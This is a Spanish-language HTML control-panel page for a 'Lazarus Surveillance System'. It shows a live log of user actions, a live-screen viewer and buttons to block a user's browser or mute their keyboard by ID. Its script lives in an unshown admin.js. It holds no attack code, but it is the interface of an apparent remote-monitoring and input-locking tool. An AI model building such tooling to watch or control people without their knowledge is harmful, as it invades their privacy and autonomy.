<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel de Control | Lazarus AlexNAV</title>
    <style>
        :root { --red: #ff3b30; --green: #34c759; --bg: #0a0a0c; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
        .card { background: #16161d; border: 1px solid #333; border-radius: 15px; padding: 20px; overflow: hidden; }
        h2 { color: var(--red); text-transform: uppercase; font-size: 0.9rem; letter-spacing: 1px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.85rem; }
        th { text-align: left; color: #666; padding-bottom: 10px; }
        td { padding: 10px 0; border-bottom: 1px solid #222; }
        .live-screen { background: #000; height: 200px; border-radius: 10px; display: flex; align-items: center; justify-content: center; border: 1px dashed #444; }
        .btn { width: 100%; padding: 12px; margin-top: 10px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-block { background: var(--red); color: white; }
        .btn-mute { background: #555; color: white; }
    </style>
</head>
<body>
    <h1>Lazarus Surveillance System</h1>
    <div class="grid">
        <div class="card">
            <h2>Historial de Usuarios en Vivo</h2>
            <table>
                <thead>
                    <tr><th>USUARIO</th><th>ACCIÓN</th><th>DETALLE</th><th>HORA</th></tr>
                </thead>
                <tbody id="logs-body">
                    </tbody>
            </table>
        </div>

        <div class="card">
            <h2>Pantalla en Directo</h2>
            <div class="live-screen" id="live-monitor">Esperando señal...</div>
            
            <h2 style="margin-top:20px;">Acciones de Bloqueo</h2>
            <input type="text" id="target-user" placeholder="ID de Usuario">
            <button class="btn btn-block" onclick="enviarOrden('BLOQUEAR')">BLOQUEAR NAVEGADOR</button>
            <button class="btn btn-mute" onclick="enviarOrden('MUTE')">MUTEAR TECLADO</button>
            <button class="btn" style="background:var(--green)" onclick="enviarOrden('LIBERAR')">DESBLOQUEAR</button>
        </div>
    </div>

    <script src="admin.js"></script>
</body>
</html>
